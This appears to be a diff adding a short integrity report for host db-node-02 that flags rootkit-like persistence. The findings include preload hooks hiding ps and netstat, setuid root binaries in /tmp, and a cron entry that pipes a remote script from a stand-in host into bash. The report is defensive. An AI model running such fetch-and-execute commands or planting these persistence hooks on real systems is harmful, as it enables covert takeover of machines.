@@ -1,0 +1,13 @@
+System Integrity Report
+Host: db-node-02
+Date: 2026-10-07
+
+File Integrity Findings:
+- /etc/ld.so.preload contains unexpected preload hook
+- LD_PRELOAD hook observed for ps and netstat commands
+- Suspicious cron entry: @reboot curl http://example.invalid/update.sh | bash
+- setuid root binary found in /tmp/.cache
+- chmod 4777 used on unknown executable
+
+Conclusion:
+Rootkit-like persistence found. Risk level is high.
